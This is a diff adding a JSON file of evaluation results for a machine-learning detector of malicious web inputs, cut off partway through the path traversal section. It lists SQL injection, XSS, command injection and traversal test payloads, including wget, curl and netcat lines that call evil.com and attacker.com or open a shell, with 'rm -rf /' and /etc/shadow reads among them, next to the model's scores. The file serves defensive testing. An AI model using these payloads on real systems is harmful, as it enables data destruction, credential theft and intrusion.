@@ -1,0 +1,1658 @@
+{
+  "category_results": {
+    "benign_inputs": {
+      "results": [
+        {
+          "input": "hello world",
+          "expected_malicious": false,
+          "expected_type": "none",
+          "predicted_malicious": false,
+          "correct": true,
+          "ml_result": {
+            "is_malicious": false,
+            "binary_confidence": 0.9762633983045816,
+            "binary_probability": 0.023736601695418358,
+            "attack_type": null,
+            "attack_confidence": null,
+            "class_probabilities": null,
+            "total_inference_time_ms": 250.6425380706787
+          }
+        },
+        {
+          "input": "user@example.com",
+          "expected_malicious": false,
+          "expected_type": "none",
+          "predicted_malicious": false,
+          "correct": true,
+          "ml_result": {
+            "is_malicious": false,
+            "binary_confidence": 0.9333231747150421,
+            "binary_probability": 0.06667682528495789,
+            "attack_type": null,
+            "attack_confidence": null,
+            "class_probabilities": null,
+            "total_inference_time_ms": 54.7032356262207
+          }
+        },
+        {
+          "input": "search for products",
+          "expected_malicious": false,
+          "expected_type": "none",
+          "predicted_malicious": false,
+          "correct": true,
+          "ml_result": {
+            "is_malicious": false,
+            "binary_confidence": 0.9123808816075325,
+            "binary_probability": 0.0876191183924675,
+            "attack_type": null,
+            "attack_confidence": null,
+            "class_probabilities": null,
+            "total_inference_time_ms": 49.237728118896484
+          }
+        },
+        {
+          "input": "normal user input text",
+          "expected_malicious": false,
+          "expected_type": "none",
+          "predicted_malicious": false,
+          "correct": true,
+          "ml_result": {
+            "is_malicious": false,
+            "binary_confidence": 0.8297576755285263,
+            "binary_probability": 0.1702423244714737,
+            "attack_type": null,
+            "attack_confidence": null,
+            "class_probabilities": null,
+            "total_inference_time_ms": 48.6910343170166
+          }
+        },
+        {
+          "input": "product catalog page",
+          "expected_malicious": false,
+          "expected_type": "none",
+          "predicted_malicious": false,
+          "correct": true,
+          "ml_result": {
+            "is_malicious": false,
+            "binary_confidence": 0.925333209335804,
+            "binary_probability": 0.07466679066419601,
+            "attack_type": null,
+            "attack_confidence": null,
+            "class_probabilities": null,
+            "total_inference_time_ms": 48.015594482421875
+          }
+        },
+        {
+          "input": "user profile information",
+          "expected_malicious": false,
+          "expected_type": "none",
+          "predicted_malicious": false,
+          "correct": true,
+          "ml_result": {
+            "is_malicious": false,
+            "binary_confidence": 0.9491786696016788,
+            "binary_probability": 0.05082133039832115,
+            "attack_type": null,
+            "attack_confidence": null,
+            "class_probabilities": null,
+            "total_inference_time_ms": 49.01599884033203
+          }
+        },
+        {
+          "input": "contact form submission",
+          "expected_malicious": false,
+          "expected_type": "none",
+          "predicted_malicious": false,
+          "correct": true,
+          "ml_result": {
+            "is_malicious": false,
+            "binary_confidence": 0.8626585155725479,
+            "binary_probability": 0.1373414844274521,
+            "attack_type": null,
+            "attack_confidence": null,
+            "class_probabilities": null,
+            "total_inference_time_ms": 50.07195472717285
+          }
+        },
+        {
+          "input": "newsletter subscription",
+          "expected_malicious": false,
+          "expected_type": "none",
+          "predicted_malicious": false,
+          "correct": true,
+          "ml_result": {
+            "is_malicious": false,
+            "binary_confidence": 0.7775266915559769,
+            "binary_probability": 0.22247330844402313,
+            "attack_type": null,
+            "attack_confidence": null,
+            "class_probabilities": null,
+            "total_inference_time_ms": 63.85517120361328
+          }
+        },
+        {
+          "input": "password reset request",
+          "expected_malicious": false,
+          "expected_type": "none",
+          "predicted_malicious": false,
+          "correct": true,
+          "ml_result": {
+            "is_malicious": false,
+            "binary_confidence": 0.8462297916412354,
+            "binary_probability": 0.15377020835876465,
+            "attack_type": null,
+            "attack_confidence": null,
+            "class_probabilities": null,
+            "total_inference_time_ms": 50.752878189086914
+          }
+        },
+        {
+          "input": "shopping cart checkout",
+          "expected_malicious": false,
+          "expected_type": "none",
+          "predicted_malicious": false,
+          "correct": true,
+          "ml_result": {
+            "is_malicious": false,
+            "binary_confidence": 0.8928833305835724,
+            "binary_probability": 0.10711666941642761,
+            "attack_type": null,
+            "attack_confidence": null,
+            "class_probabilities": null,
+            "total_inference_time_ms": 50.92263221740723
+          }
+        }
+      ],
+      "accuracy": 100.0,
+      "correct": 10,
+      "total": 10
+    },
+    "sql_injection": {
+      "results": [
+        {
+          "input": "'; DROP TABLE users; --",
+          "expected_malicious": true,
+          "expected_type": "sqli",
+          "predicted_malicious": false,
+          "correct": false,
+          "ml_result": {
+            "is_malicious": false,
+            "binary_confidence": 0.7472273111343384,
+            "binary_probability": 0.2527726888656616,
+            "attack_type": null,
+            "attack_confidence": null,
+            "class_probabilities": null,
+            "total_inference_time_ms": 54.868221282958984
+          }
+        },
+        {
+          "input": "1' OR '1'='1",
+          "expected_malicious": true,
+          "expected_type": "sqli",
+          "predicted_malicious": true,
+          "correct": true,
+          "ml_result": {
+            "is_malicious": true,
+            "binary_confidence": 0.9722859263420105,
+            "binary_probability": 0.9722859263420105,
+            "attack_type": "commandi",
+            "attack_confidence": 0.7034030556678772,
+            "class_probabilities": {
+              "sqli": 0.28914710879325867,
+              "commandi": 0.7034030556678772,
+              "xss": 0.007449857424944639,
+              "traversal": 1.745593891655517e-08
+            },
+            "total_inference_time_ms": 130.68914413452148
+          }
+        },
+        {
+          "input": "admin'--",
+          "expected_malicious": true,
+          "expected_type": "sqli",
+          "predicted_malicious": true,
+          "correct": true,
+          "ml_result": {
+            "is_malicious": true,
+            "binary_confidence": 0.8589323163032532,
+            "binary_probability": 0.8589323163032532,
+            "attack_type": "commandi",
+            "attack_confidence": 0.9988504648208618,
+            "class_probabilities": {
+              "sqli": 0.0011305689113214612,
+              "commandi": 0.9988504648208618,
+              "xss": 1.8919152353191748e-05,
+              "traversal": 4.53429152003082e-08
+            },
+            "total_inference_time_ms": 121.63782119750977
+          }
+        },
+        {
+          "input": "' UNION SELECT * FROM passwords--",
+          "expected_malicious": true,
+          "expected_type": "sqli",
+          "predicted_malicious": false,
+          "correct": false,
+          "ml_result": {
+            "is_malicious": false,
+            "binary_confidence": 0.7832495421171188,
+            "binary_probability": 0.21675045788288116,
+            "attack_type": null,
+            "attack_confidence": null,
+            "class_probabilities": null,
+            "total_inference_time_ms": 69.05794143676758
+          }
+        },
+        {
+          "input": "1; DELETE FROM accounts; --",
+          "expected_malicious": true,
+          "expected_type": "sqli",
+          "predicted_malicious": false,
+          "correct": false,
+          "ml_result": {
+            "is_malicious": false,
+            "binary_confidence": 0.9021351635456085,
+            "binary_probability": 0.09786483645439148,
+            "attack_type": null,
+            "attack_confidence": null,
+            "class_probabilities": null,
+            "total_inference_time_ms": 80.42478561401367
+          }
+        },
+        {
+          "input": "' OR 1=1#",
+          "expected_malicious": true,
+          "expected_type": "sqli",
+          "predicted_malicious": true,
+          "correct": true,
+          "ml_result": {
+            "is_malicious": true,
+            "binary_confidence": 0.9338905215263367,
+            "binary_probability": 0.9338905215263367,
+            "attack_type": "xss",
+            "attack_confidence": 0.7377565503120422,
+            "class_probabilities": {
+              "sqli": 0.12523555755615234,
+              "commandi": 0.1370064914226532,
+              "xss": 0.7377565503120422,
+              "traversal": 1.3685211115443963e-06
+            },
+            "total_inference_time_ms": 129.8964023590088
+          }
+        },
+        {
+          "input": "'; INSERT INTO users VALUES('hacker','pass');--",
+          "expected_malicious": true,
+          "expected_type": "sqli",
+          "predicted_malicious": true,
+          "correct": true,
+          "ml_result": {
+            "is_malicious": true,
+            "binary_confidence": 0.9346464276313782,
+            "binary_probability": 0.9346464276313782,
+            "attack_type": "commandi",
+            "attack_confidence": 0.500508189201355,
+            "class_probabilities": {
+              "sqli": 0.49693062901496887,
+              "commandi": 0.500508189201355,
+              "xss": 0.002083342522382736,
+              "traversal": 0.00047781760804355145
+            },
+            "total_inference_time_ms": 117.30146408081055
+          }
+        },
+        {
+          "input": "1' AND (SELECT COUNT(*) FROM users)>0--",
+          "expected_malicious": true,
+          "expected_type": "sqli",
+          "predicted_malicious": true,
+          "correct": true,
+          "ml_result": {
+            "is_malicious": true,
+            "binary_confidence": 0.7047620415687561,
+            "binary_probability": 0.7047620415687561,
+            "attack_type": "commandi",
+            "attack_confidence": 0.9173871278762817,
+            "class_probabilities": {
+              "sqli": 0.0807223692536354,
+              "commandi": 0.9173871278762817,
+              "xss": 0.0018295715562999249,
+              "traversal": 6.088892405387014e-05
+            },
+            "total_inference_time_ms": 120.66149711608887
+          }
+        },
+        {
+          "input": "' OR 'x'='x",
+          "expected_malicious": true,
+          "expected_type": "sqli",
+          "predicted_malicious": true,
+          "correct": true,
+          "ml_result": {
+            "is_malicious": true,
+            "binary_confidence": 0.9099364876747131,
+            "binary_probability": 0.9099364876747131,
+            "attack_type": "commandi",
+            "attack_confidence": 0.6465298533439636,
+            "class_probabilities": {
+              "sqli": 0.1845695972442627,
+              "commandi": 0.6465298533439636,
+              "xss": 0.1688959300518036,
+              "traversal": 4.599364729074296e-06
+            },
+            "total_inference_time_ms": 126.83558464050293
+          }
+        },
+        {
+          "input": "admin'; DROP DATABASE production; --",
+          "expected_malicious": true,
+          "expected_type": "sqli",
+          "predicted_malicious": false,
+          "correct": false,
+          "ml_result": {
+            "is_malicious": false,
+            "binary_confidence": 0.5237609446048737,
+            "binary_probability": 0.47623905539512634,
+            "attack_type": null,
+            "attack_confidence": null,
+            "class_probabilities": null,
+            "total_inference_time_ms": 65.72675704956055
+          }
+        },
+        {
+          "input": "1' UNION SELECT password FROM admin--",
+          "expected_malicious": true,
+          "expected_type": "sqli",
+          "predicted_malicious": false,
+          "correct": false,
+          "ml_result": {
+            "is_malicious": false,
+            "binary_confidence": 0.7177108526229858,
+            "binary_probability": 0.28228914737701416,
+            "attack_type": null,
+            "attack_confidence": null,
+            "class_probabilities": null,
+            "total_inference_time_ms": 64.24236297607422
+          }
+        },
+        {
+          "input": "'; EXEC xp_cmdshell('dir'); --",
+          "expected_malicious": true,
+          "expected_type": "sqli",
+          "predicted_malicious": true,
+          "correct": true,
+          "ml_result": {
+            "is_malicious": true,
+            "binary_confidence": 0.8070778250694275,
+            "binary_probability": 0.8070778250694275,
+            "attack_type": "commandi",
+            "attack_confidence": 0.9722024202346802,
+            "class_probabilities": {
+              "sqli": 0.027117259800434113,
+              "commandi": 0.9722024202346802,
+              "xss": 0.0006797935348004103,
+              "traversal": 5.208475499784981e-07
+            },
+            "total_inference_time_ms": 121.92225456237793
+          }
+        },
+        {
+          "input": "' AND 1=1 UNION SELECT null,username,password FROM users--",
+          "expected_malicious": true,
+          "expected_type": "sqli",
+          "predicted_malicious": true,
+          "correct": true,
+          "ml_result": {
+            "is_malicious": true,
+            "binary_confidence": 0.8184210062026978,
+            "binary_probability": 0.8184210062026978,
+            "attack_type": "commandi",
+            "attack_confidence": 0.5152687430381775,
+            "class_probabilities": {
+              "sqli": 0.4844313859939575,
+              "commandi": 0.5152687430381775,
+              "xss": 0.00029802400968037546,
+              "traversal": 1.8572178532849648e-06
+            },
+            "total_inference_time_ms": 113.97075653076172
+          }
+        },
+        {
+          "input": "1' OR SLEEP(5)--",
+          "expected_malicious": true,
+          "expected_type": "sqli",
+          "predicted_malicious": true,
+          "correct": true,
+          "ml_result": {
+            "is_malicious": true,
+            "binary_confidence": 0.9574498534202576,
+            "binary_probability": 0.9574498534202576,
+            "attack_type": "sqli",
+            "attack_confidence": 0.8538605570793152,
+            "class_probabilities": {
+              "sqli": 0.8538605570793152,
+              "commandi": 0.14584128558635712,
+              "xss": 0.00026970793260261416,
+              "traversal": 2.8365182515699416e-05
+            },
+            "total_inference_time_ms": 115.24462699890137
+          }
+        },
+        {
+          "input": "'; WAITFOR DELAY '00:00:05'--",
+          "expected_malicious": true,
+          "expected_type": "sqli",
+          "predicted_malicious": true,
+          "correct": true,
+          "ml_result": {
+            "is_malicious": true,
+            "binary_confidence": 0.6699532270431519,
+            "binary_probability": 0.6699532270431519,
+            "attack_type": "commandi",
+            "attack_confidence": 0.9292111396789551,
+            "class_probabilities": {
+              "sqli": 0.06966812163591385,
+              "commandi": 0.9292111396789551,
+              "xss": 0.001078535569831729,
+              "traversal": 4.2063551518367603e-05
+            },
+            "total_inference_time_ms": 115.57793617248535
+          }
+        }
+      ],
+      "accuracy": 66.66666666666666,
+      "correct": 10,
+      "total": 15
+    },
+    "xss_attacks": {
+      "results": [
+        {
+          "input": "<script>alert('XSS')</script>",
+          "expected_malicious": true,
+          "expected_type": "xss",
+          "predicted_malicious": true,
+          "correct": true,
+          "ml_result": {
+            "is_malicious": true,
+            "binary_confidence": 0.9890556335449219,
+            "binary_probability": 0.9890556335449219,
+            "attack_type": "xss",
+            "attack_confidence": 0.999998927116394,
+            "class_probabilities": {
+              "sqli": 4.585708381910081e-07,
+              "commandi": 6.259342058001494e-07,
+              "xss": 0.999998927116394,
+              "traversal": 7.57604701195902e-10
+            },
+            "total_inference_time_ms": 121.53124809265137
+          }
+        },
+        {
+          "input": "<img src=x onerror=alert(1)>",
+          "expected_malicious": true,
+          "expected_type": "xss",
+          "predicted_malicious": true,
+          "correct": true,
+          "ml_result": {
+            "is_malicious": true,
+            "binary_confidence": 0.9855887293815613,
+            "binary_probability": 0.9855887293815613,
+            "attack_type": "xss",
+            "attack_confidence": 1.0,
+            "class_probabilities": {
+              "sqli": 2.5031663852814745e-08,
+              "commandi": 1.2549507211190303e-08,
+              "xss": 1.0,
+              "traversal": 3.9754405821955385e-13
+            },
+            "total_inference_time_ms": 109.82894897460938
+          }
+        },
+        {
+          "input": "javascript:alert('XSS')",
+          "expected_malicious": true,
+          "expected_type": "xss",
+          "predicted_malicious": true,
+          "correct": true,
+          "ml_result": {
+            "is_malicious": true,
+            "binary_confidence": 0.9403884410858154,
+            "binary_probability": 0.9403884410858154,
+            "attack_type": "xss",
+            "attack_confidence": 0.9999555349349976,
+            "class_probabilities": {
+              "sqli": 1.3826804206473753e-05,
+              "commandi": 3.060057497350499e-05,
+              "xss": 0.9999555349349976,
+              "traversal": 1.7897777482289712e-08
+            },
+            "total_inference_time_ms": 120.64790725708008
+          }
+        },
+        {
+          "input": "<svg onload=alert('XSS')>",
+          "expected_malicious": true,
+          "expected_type": "xss",
+          "predicted_malicious": true,
+          "correct": true,
+          "ml_result": {
+            "is_malicious": true,
+            "binary_confidence": 0.978620171546936,
+            "binary_probability": 0.978620171546936,
+            "attack_type": "xss",
+            "attack_confidence": 0.9998388290405273,
+            "class_probabilities": {
+              "sqli": 0.00015689160500187427,
+              "commandi": 4.22453513237997e-06,
+              "xss": 0.9998388290405273,
+              "traversal": 8.528420636366718e-09
+            },
+            "total_inference_time_ms": 114.02082443237305
+          }
+        },
+        {
+          "input": "<iframe src=javascript:alert('XSS')></iframe>",
+          "expected_malicious": true,
+          "expected_type": "xss",
+          "predicted_malicious": true,
+          "correct": true,
+          "ml_result": {
+            "is_malicious": true,
+            "binary_confidence": 0.9454188942909241,
+            "binary_probability": 0.9454188942909241,
+            "attack_type": "xss",
+            "attack_confidence": 0.9999943971633911,
+            "class_probabilities": {
+              "sqli": 3.836972155113472e-06,
+              "commandi": 1.7584738998266403e-06,
+              "xss": 0.9999943971633911,
+              "traversal": 7.552139358324439e-09
+            },
+            "total_inference_time_ms": 117.16628074645996
+          }
+        },
+        {
+          "input": "<body onload=alert('XSS')>",
+          "expected_malicious": true,
+          "expected_type": "xss",
+          "predicted_malicious": true,
+          "correct": true,
+          "ml_result": {
+            "is_malicious": true,
+            "binary_confidence": 0.9829210638999939,
+            "binary_probability": 0.9829210638999939,
+            "attack_type": "xss",
+            "attack_confidence": 0.9997814297676086,
+            "class_probabilities": {
+              "sqli": 0.0002142642333637923,
+              "commandi": 4.265100869815797e-06,
+              "xss": 0.9997814297676086,
+              "traversal": 5.114189960409021e-09
+            },
+            "total_inference_time_ms": 114.23015594482422
+          }
+        },
+        {
+          "input": "<input type=text onclick=alert('XSS')>",
+          "expected_malicious": true,
+          "expected_type": "xss",
+          "predicted_malicious": true,
+          "correct": true,
+          "ml_result": {
+            "is_malicious": true,
+            "binary_confidence": 0.9786542057991028,
+            "binary_probability": 0.9786542057991028,
+            "attack_type": "xss",
+            "attack_confidence": 0.999962329864502,
+            "class_probabilities": {
+              "sqli": 1.8996453945874237e-05,
+              "commandi": 1.8693506717681885e-05,
+              "xss": 0.999962329864502,
+              "traversal": 4.039811152267703e-09
+            },
+            "total_inference_time_ms": 124.19748306274414
+          }
+        },
+        {
+          "input": "'><script>alert('XSS')</script>",
+          "expected_malicious": true,
+          "expected_type": "xss",
+          "predicted_malicious": true,
+          "correct": true,
+          "ml_result": {
+            "is_malicious": true,
+            "binary_confidence": 0.9900798797607422,
+            "binary_probability": 0.9900798797607422,
+            "attack_type": "xss",
+            "attack_confidence": 0.9999997615814209,
+            "class_probabilities": {
+              "sqli": 9.169534820330227e-08,
+              "commandi": 1.1137309741116042e-07,
+              "xss": 0.9999997615814209,
+              "traversal": 1.287505935199107e-10
+            },
+            "total_inference_time_ms": 144.87123489379883
+          }
+        },
+        {
+          "input": "<script src=http://evil.com/xss.js></script>",
+          "expected_malicious": true,
+          "expected_type": "xss",
+          "predicted_malicious": true,
+          "correct": true,
+          "ml_result": {
+            "is_malicious": true,
+            "binary_confidence": 0.9256111979484558,
+            "binary_probability": 0.9256111979484558,
+            "attack_type": "xss",
+            "attack_confidence": 0.9999945163726807,
+            "class_probabilities": {
+              "sqli": 9.887738627867293e-09,
+              "commandi": 5.5114842325565405e-06,
+              "xss": 0.9999945163726807,
+              "traversal": 3.182304419979687e-09
+            },
+            "total_inference_time_ms": 135.1170539855957
+          }
+        },
+        {
+          "input": "</script><script>alert('XSS')</script>",
+          "expected_malicious": true,
+          "expected_type": "xss",
+          "predicted_malicious": true,
+          "correct": true,
+          "ml_result": {
+            "is_malicious": true,
+            "binary_confidence": 0.9900235533714294,
+            "binary_probability": 0.9900235533714294,
+            "attack_type": "xss",
+            "attack_confidence": 0.9999988079071045,
+            "class_probabilities": {
+              "sqli": 7.218088740046369e-07,
+              "commandi": 5.286908049129124e-07,
+              "xss": 0.9999988079071045,
+              "traversal": 8.077158941688367e-10
+            },
+            "total_inference_time_ms": 114.88580703735352
+          }
+        },
+        {
+          "input": "<img src='' onerror=alert(String.fromCharCode(88,83,83))>",
+          "expected_malicious": true,
+          "expected_type": "xss",
+          "predicted_malicious": true,
+          "correct": true,
+          "ml_result": {
+            "is_malicious": true,
+            "binary_confidence": 0.9131217002868652,
+            "binary_probability": 0.9131217002868652,
+            "attack_type": "xss",
+            "attack_confidence": 0.9999185800552368,
+            "class_probabilities": {
+              "sqli": 2.2836959033156745e-05,
+              "commandi": 5.861093814019114e-05,
+              "xss": 0.9999185800552368,
+              "traversal": 6.560802123800613e-09
+            },
+            "total_inference_time_ms": 129.2710304260254
+          }
+        },
+        {
+          "input": "<svg><script>alert('XSS')</script></svg>",
+          "expected_malicious": true,
+          "expected_type": "xss",
+          "predicted_malicious": true,
+          "correct": true,
+          "ml_result": {
+            "is_malicious": true,
+            "binary_confidence": 0.9922561645507812,
+            "binary_probability": 0.9922561645507812,
+            "attack_type": "xss",
+            "attack_confidence": 0.999998927116394,
+            "class_probabilities": {
+              "sqli": 1.0100769713972113e-06,
+              "commandi": 4.801646369401169e-08,
+              "xss": 0.999998927116394,
+              "traversal": 5.99751470709009e-10
+            },
+            "total_inference_time_ms": 125.71978569030762
+          }
+        },
+        {
+          "input": "<object data='data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg=='></object>",
+          "expected_malicious": true,
+          "expected_type": "xss",
+          "predicted_malicious": true,
+          "correct": true,
+          "ml_result": {
+            "is_malicious": true,
+            "binary_confidence": 0.9576552510261536,
+            "binary_probability": 0.9576552510261536,
+            "attack_type": "xss",
+            "attack_confidence": 0.9996589422225952,
+            "class_probabilities": {
+              "sqli": 5.609096842817962e-05,
+              "commandi": 0.0002846747520379722,
+              "xss": 0.9996589422225952,
+              "traversal": 2.2320274695175613e-07
+            },
+            "total_inference_time_ms": 114.01057243347168
+          }
+        },
+        {
+          "input": "<embed src='data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg=='></embed>",
+          "expected_malicious": true,
+          "expected_type": "xss",
+          "predicted_malicious": true,
+          "correct": true,
+          "ml_result": {
+            "is_malicious": true,
+            "binary_confidence": 0.9807041883468628,
+            "binary_probability": 0.9807041883468628,
+            "attack_type": "xss",
+            "attack_confidence": 0.9998464584350586,
+            "class_probabilities": {
+              "sqli": 2.5637755243224092e-05,
+              "commandi": 0.0001274813257623464,
+              "xss": 0.9998464584350586,
+              "traversal": 3.8995236195660254e-07
+            },
+            "total_inference_time_ms": 118.2854175567627
+          }
+        }
+      ],
+      "accuracy": 100.0,
+      "correct": 14,
+      "total": 14
+    },
+    "command_injection": {
+      "results": [
+        {
+          "input": "; ls -la",
+          "expected_malicious": true,
+          "expected_type": "commandi",
+          "predicted_malicious": false,
+          "correct": false,
+          "ml_result": {
+            "is_malicious": false,
+            "binary_confidence": 0.6139265894889832,
+            "binary_probability": 0.38607341051101685,
+            "attack_type": null,
+            "attack_confidence": null,
+            "class_probabilities": null,
+            "total_inference_time_ms": 62.60561943054199
+          }
+        },
+        {
+          "input": "| whoami",
+          "expected_malicious": true,
+          "expected_type": "commandi",
+          "predicted_malicious": false,
+          "correct": false,
+          "ml_result": {
+            "is_malicious": false,
+            "binary_confidence": 0.6351832449436188,
+            "binary_probability": 0.3648167550563812,
+            "attack_type": null,
+            "attack_confidence": null,
+            "class_probabilities": null,
+            "total_inference_time_ms": 85.76369285583496
+          }
+        },
+        {
+          "input": "& echo 'pwned'",
+          "expected_malicious": true,
+          "expected_type": "commandi",
+          "predicted_malicious": true,
+          "correct": true,
+          "ml_result": {
+            "is_malicious": true,
+            "binary_confidence": 0.7764718532562256,
+            "binary_probability": 0.7764718532562256,
+            "attack_type": "commandi",
+            "attack_confidence": 0.9999383687973022,
+            "class_probabilities": {
+              "sqli": 5.685882206307724e-05,
+              "commandi": 0.9999383687973022,
+              "xss": 4.55434201285243e-06,
+              "traversal": 1.9403162809794594e-07
+            },
+            "total_inference_time_ms": 254.33969497680664
+          }
+        },
+        {
+          "input": "`cat /etc/passwd`",
+          "expected_malicious": true,
+          "expected_type": "commandi",
+          "predicted_malicious": true,
+          "correct": true,
+          "ml_result": {
+            "is_malicious": true,
+            "binary_confidence": 0.6644302010536194,
+            "binary_probability": 0.6644302010536194,
+            "attack_type": "commandi",
+            "attack_confidence": 0.9983589053153992,
+            "class_probabilities": {
+              "sqli": 0.0001312039967160672,
+              "commandi": 0.9983589053153992,
+              "xss": 0.001103816437534988,
+              "traversal": 0.0004061195650137961
+            },
+            "total_inference_time_ms": 586.8985652923584
+          }
+        },
+        {
+          "input": "$(rm -rf /)",
+          "expected_malicious": true,
+          "expected_type": "commandi",
+          "predicted_malicious": true,
+          "correct": true,
+          "ml_result": {
+            "is_malicious": true,
+            "binary_confidence": 0.8862798810005188,
+            "binary_probability": 0.8862798810005188,
+            "attack_type": "commandi",
+            "attack_confidence": 0.999940037727356,
+            "class_probabilities": {
+              "sqli": 5.2664647228084505e-05,
+              "commandi": 0.999940037727356,
+              "xss": 7.320221357076662e-06,
+              "traversal": 1.3350387462196522e-08
+            },
+            "total_inference_time_ms": 115.02265930175781
+          }
+        },
+        {
+          "input": "; wget http://evil.com/shell.php",
+          "expected_malicious": true,
+          "expected_type": "commandi",
+          "predicted_malicious": false,
+          "correct": false,
+          "ml_result": {
+            "is_malicious": false,
+            "binary_confidence": 0.554465651512146,
+            "binary_probability": 0.445534348487854,
+            "attack_type": null,
+            "attack_confidence": null,
+            "class_probabilities": null,
+            "total_inference_time_ms": 63.445329666137695
+          }
+        },
+        {
+          "input": "|| cat /etc/shadow",
+          "expected_malicious": true,
+          "expected_type": "commandi",
+          "predicted_malicious": true,
+          "correct": true,
+          "ml_result": {
+            "is_malicious": true,
+            "binary_confidence": 0.6574022173881531,
+            "binary_probability": 0.6574022173881531,
+            "attack_type": "commandi",
+            "attack_confidence": 0.9702218770980835,
+            "class_probabilities": {
+              "sqli": 0.0001317999849561602,
+              "commandi": 0.9702218770980835,
+              "xss": 0.006714620161801577,
+              "traversal": 0.02293173037469387
+            },
+            "total_inference_time_ms": 146.8799114227295
+          }
+        },
+        {
+          "input": "; nc -l -p 4444 -e /bin/bash",
+          "expected_malicious": true,
+          "expected_type": "commandi",
+          "predicted_malicious": true,
+          "correct": true,
+          "ml_result": {
+            "is_malicious": true,
+            "binary_confidence": 0.826412558555603,
+            "binary_probability": 0.826412558555603,
+            "attack_type": "commandi",
+            "attack_confidence": 0.999974250793457,
+            "class_probabilities": {
+              "sqli": 2.459954885125626e-05,
+              "commandi": 0.999974250793457,
+              "xss": 7.686827530051232e-07,
+              "traversal": 5.114245027471043e-07
+            },
+            "total_inference_time_ms": 141.81780815124512
+          }
+        },
+        {
+          "input": "& curl http://attacker.com/exfil",
+          "expected_malicious": true,
+          "expected_type": "commandi",
+          "predicted_malicious": true,
+          "correct": true,
+          "ml_result": {
+            "is_malicious": true,
+            "binary_confidence": 0.5678728222846985,
+            "binary_probability": 0.5678728222846985,
+            "attack_type": "commandi",
+            "attack_confidence": 0.8483451008796692,
+            "class_probabilities": {
+              "sqli": 0.00013183946430217475,
+              "commandi": 0.8483451008796692,
+              "xss": 0.15094701945781708,
+              "traversal": 0.0005758944898843765
+            },
+            "total_inference_time_ms": 111.18030548095703
+          }
+        },
+        {
+          "input": "`python -c 'import os; os.system(\"rm -rf /\")'`",
+          "expected_malicious": true,
+          "expected_type": "commandi",
+          "predicted_malicious": true,
+          "correct": true,
+          "ml_result": {
+            "is_malicious": true,
+            "binary_confidence": 0.8383638262748718,
+            "binary_probability": 0.8383638262748718,
+            "attack_type": "commandi",
+            "attack_confidence": 0.9984702467918396,
+            "class_probabilities": {
+              "sqli": 0.0005708307144232094,
+              "commandi": 0.9984702467918396,
+              "xss": 0.0009587804670445621,
+              "traversal": 6.715878697605149e-08
+            },
+            "total_inference_time_ms": 142.85016059875488
+          }
+        },
+        {
+          "input": "; python -c \"import socket,subprocess,os;s=socket.socket()\"",
+          "expected_malicious": true,
+          "expected_type": "commandi",
+          "predicted_malicious": true,
+          "correct": true,
+          "ml_result": {
+            "is_malicious": true,
+            "binary_confidence": 0.6439392566680908,
+            "binary_probability": 0.6439392566680908,
+            "attack_type": "xss",
+            "attack_confidence": 0.5941472053527832,
+            "class_probabilities": {
+              "sqli": 0.0012138299643993378,
+              "commandi": 0.40306946635246277,
+              "xss": 0.5941472053527832,
+              "traversal": 0.001569573418237269
+            },
+            "total_inference_time_ms": 111.87005043029785
+          }
+        },
+        {
+          "input": "| base64 /etc/passwd",
+          "expected_malicious": true,
+          "expected_type": "commandi",
+          "predicted_malicious": true,
+          "correct": true,
+          "ml_result": {
+            "is_malicious": true,
+            "binary_confidence": 0.7626100182533264,
+            "binary_probability": 0.7626100182533264,
+            "attack_type": "commandi",
+            "attack_confidence": 0.6938295960426331,
+            "class_probabilities": {
+              "sqli": 0.0003801326674874872,
+              "commandi": 0.6938295960426331,
+              "xss": 0.0014829672873020172,
+              "traversal": 0.3043072521686554
+            },
+            "total_inference_time_ms": 96.66037559509277
+          }
+        },
+        {
+          "input": "& powershell -c \"Get-Process\"",
+          "expected_malicious": true,
+          "expected_type": "commandi",
+          "predicted_malicious": false,
+          "correct": false,
+          "ml_result": {
+            "is_malicious": false,
+            "binary_confidence": 0.6647325456142426,
+            "binary_probability": 0.33526745438575745,
+            "attack_type": null,
+            "attack_confidence": null,
+            "class_probabilities": null,
+            "total_inference_time_ms": 40.567874908447266
+          }
+        },
+        {
+          "input": "`php -r 'system(\"id\");'`",
+          "expected_malicious": true,
+          "expected_type": "commandi",
+          "predicted_malicious": true,
+          "correct": true,
+          "ml_result": {
+            "is_malicious": true,
+            "binary_confidence": 0.8872892260551453,
+            "binary_probability": 0.8872892260551453,
+            "attack_type": "commandi",
+            "attack_confidence": 0.9910219311714172,
+            "class_probabilities": {
+              "sqli": 0.008005572482943535,
+              "commandi": 0.9910219311714172,
+              "xss": 0.0009722421527840197,
+              "traversal": 2.032371497762142e-07
+            },
+            "total_inference_time_ms": 95.51143646240234
+          }
+        }
+      ],
+      "accuracy": 71.42857142857143,
+      "correct": 10,
+      "total": 14
+    },
+    "path_traversal": {
+      "results": [
+        {
+          "input": "../../../etc/passwd",
+          "expected_malicious": true,
+          "expected_type": "traversal",
+          "predicted_malicious": true,
+          "correct": true,
+          "ml_result": {
+            "is_malicious": true,
+            "binary_confidence": 0.9221917986869812,
+            "binary_probability": 0.9221917986869812,
+            "attack_type": "traversal",
+            "attack_confidence": 0.9997988343238831,
+            "class_probabilities": {
+              "sqli": 3.10308720941066e-08,
+              "commandi": 0.00019156841153744608,
+              "xss": 9.582303391653113e-06,
+              "traversal": 0.9997988343238831
+            },
+            "total_inference_time_ms": 159.83009338378906
+          }
+        },
+        {
+          "input": "..\\..\\..\\windows\\system32\\config\\sam",
+          "expected_malicious": true,
+          "expected_type": "traversal",
+          "predicted_malicious": true,
+          "correct": true,
+          "ml_result": {
+            "is_malicious": true,
+            "binary_confidence": 0.8825807571411133,
+            "binary_probability": 0.8825807571411133,
+            "attack_type": "traversal",
+            "attack_confidence": 0.9981574416160583,
+            "class_probabilities": {
+              "sqli": 3.6639157769968733e-06,
+              "commandi": 0.00179774418938905,
+              "xss": 4.119248842471279e-05,
+              "traversal": 0.9981574416160583
+            },
+            "total_inference_time_ms": 87.68463134765625
+          }
+        },
+        {
+          "input": "/etc/passwd",
+          "expected_malicious": true,
+          "expected_type": "traversal",
+          "predicted_malicious": true,
+          "correct": true,
+          "ml_result": {
+            "is_malicious": true,
+            "binary_confidence": 0.5822623372077942,
+            "binary_probability": 0.5822623372077942,
+            "attack_type": "commandi",
+            "attack_confidence": 0.9889055490493774,
+            "class_probabilities": {
+              "sqli": 0.0008811895968392491,
+              "commandi": 0.9889055490493774,
